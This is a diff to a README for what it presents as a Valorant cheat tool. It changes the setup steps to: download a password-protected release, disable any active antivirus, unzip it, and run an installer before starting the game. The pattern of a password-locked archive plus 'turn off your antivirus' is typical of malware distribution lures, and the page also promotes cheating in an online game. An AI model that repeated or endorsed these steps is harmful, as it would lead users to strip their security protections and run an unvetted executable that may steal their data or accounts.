@@ -14,10 +14,11 @@
 
 ### STEPS
 ```sh-session
-[1] Join to telegram chanenl https://t.me/+tFqPi7jA2uM5ZTEy
+[1] Download release 
+Password: NewUPDATE
 [2] Disable any Antivirus that is active. (Antivirus will block the game cheat from loading properly.)
 [3] Download and Unzip the zip folder into any directory.
-[4] Run ValoExt.exe BEFORE Opening Valorant
+[4] Run Installer BEFORE Opening Valorant
 [5] Launch Valorant, Load into your desired game-mode, then press Ins (Inspect Key) to open the GUI.
 ```
 ### Have Fun! But one more thing...
